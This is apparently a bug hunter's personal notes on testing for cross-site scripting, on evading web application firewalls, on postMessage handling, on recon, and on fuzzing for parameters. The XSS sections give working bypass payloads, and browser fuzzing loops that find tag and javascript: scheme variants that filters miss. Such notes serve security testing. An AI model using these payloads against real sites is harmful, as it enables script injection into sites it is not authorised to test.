# XSS
- 80% of time spent in **debugger** 
- what the browser shows in inspect is after all the decoding and permutations 
- how to find the event handlers (best way):
```js
Object.keys(window).filter(k => !k.indexOf('on'))
```
- do *more* DOM + postMessage 
	- first look for these:
		- *window.open*
		- *window.location*
		- *window.location.href*
# **FUZZ the whitespaces allowed** 
- [ ] (re read js for hackers)
- FUZZ for *HTML tags*
	- <img{fuzz}>src{fuzz}onerror=test
```js
const div = document.createElement('div'); const result = [];
const worked = p => result.push(p); for (let i=0;i<=0x10ffff; ++i)
{ div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>` } document.body.appendChild(div);
```
- FUZZ for *JS scheme*
	- javascript{FUZZ} also java{FUZZ}script 
		- (%0a, %0d,%09) (you must know)
	- {FUZZ}javascript ...
```js
log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ anchor.href = `javascript${String.fromCodePoint(i)};`; if (anchor.protocol === 'javascript:'){ log.push(i) } }
```
# **bypass**
- [ ] known waf ? -> search the net 
- [ ] CDN or application based ? -> build your own payload
- [ ] JS protection ? -> debug
- Do not use noisy Strings  
	- `<x> -> <x onxxx -> <x onxxx= `
### in HTML tags
- [ ] fuzz to find a valid tag
- [ ] *<ta[FUZZ]g> (it will gets valid server side)* #gold (***change after ruleset is a killer***)
- [ ] waf confusion 
	- [ ] *use HTML encoding* #gold
		- [ ] `<img src onerror=alert(1)` -> 403
		- [ ] `<img src>` -> 200
		- [ ] `<img src> onerror=alert(1)` -> 200
		- [ ] `<img src &#x3E onerror=alert(1)>` -> 200
```js
<!--` <img/src` onerror=alert(origin)> --!>
<img src="/" =_='' title="onerror='prompt(origin)'" >
<!<script>confirm(origin)</script>
```
### in JS execution
##### alert,prompt,etc (WORDS) are filtered ? 
- [ ] confuse
```js
- [](`cons`+`tructor`)(`const`+`ructor`)(`aler`+`t(origin)`)()
```
- [ ] payload in fragment part
```js
  location=location.hash.split('#')(1) // #javascript:alert(origin)
```
- [ ] unicode encode the js syntax
	- [ ] \u{0061}
	- [ ] \u{000000000000000000000061}
##### paranthesis,brackets,func() etc are filtered?
- [ ] **alert?.(origin)** -> use `?`
- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**

### PostMessage
- doesn't generate http req => burp doesn't capture 
- search for EventListeners 
- Chrome (not burp's)
- important properties 
	- e.source ->  *we cannot forge* 
	- e.origin -> *we cannot forge* 
	  (`e.origin === 'https://google.com'` is not vulnerable)
	- e.data
- **EXPLOIT**: `postmessage developer tool` + `DOM invader` (post message interception)
	- post your message + **Spoof Origin**  + **build POC** 
		- ==window.open (opens pop-up)==
		- iframe ALWAYS GETS DENIED
	- dom invader gets refreshed everytime, `postmessage developer tool` doesnt
	- dom invader doesnt detect listeners in app
	- BUT *if a message sent dominvader captures it* + you must test messages for each listener manually (source code)
	  - ==best way to trace== ? => search for unique string and debug in debugger

#TODO 
- [**Waf Evasion Techniques**](https://blog.isec.pl/waf-evasion-techniques/)
- [An Interesting XSS-Bypassing WAF](https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF/)

# Narrow recon

- Dorking 
	- google + ===Bing=== 
	- omit the resources you wont need
- better to use old diffrernt snapshots in wayback machine [How?](https://archive.org/developers/wayback-cdx-server.html)
	- use `fl=timestamp` + `collapse=digest` for differet hashes
	- you can use [robofinder](https://github.com/Spix0r/robofinder) for robots.txt
- Katana is not good with DOM 

# FUZZing
- sanding maformed|unexpected HTTP reqs
- to trigger unexpected behavior
- to discover hidden|unlinked  resources 
	- files
	- parameter
	- header
- you should balance the fuzzing condition
- ***FOLLOW the LEAST CHANGE principle***
### hidden resources
- unlinked directories|files
- development|testing environments
- API endpoints
- config files
### tools 
- FFUF
- recollapse
- crunch
- hand
- GAP
	- use value replacement -> observe interesting behavior(reflection|change|malfunction) -> *reduce* and change values to exploit 
- fallparams 
	- discover parameters at first and filterout (leach:) 
- x8 | Arjun
- paramMiner
- IIS shortname scanner
### checking phase
### inputs
### files
### endpoints
### parameters
- query string parameters can be increased, as long as the server handles the request (in average 25 -> 40 params)
- the number of parameters included in each HTTP request is called a ***chunk***
- fuzz on various *status codes* (including 404 -> web application)
- fuzzing *headers is similar to fuzzing parameters*, nothing special
- fuzz with both *GET and POST* HTTP methods
#### magic parameters
- every web app has hidden parameters
	- Findable in web app
	- *similar to other parameter names*
		- yahoo_home_ui
		- yahoo_home_redirect
	- totally new
- ==**programmers use the same parameter names on different pages**==
	- (e.g all params -> unfurl (extract params) -> use elsewhere)
- **where**? 
	- all HTTP req parameters
	- HTML form names + ids + etc
	- JS variable names
	- JSON object in js files
- example ? 
	- (passive (waymore + paramSpider)(`inurl:? || inurl:&`) + active (manually like GAP + automated like x8 + fallparams))
	-  (e.g manual GAP -> replace values -> interesting behavior | e.g automated x8)
	- *MANUALL is ALWASY BETTER* (false positive)
/gitcommi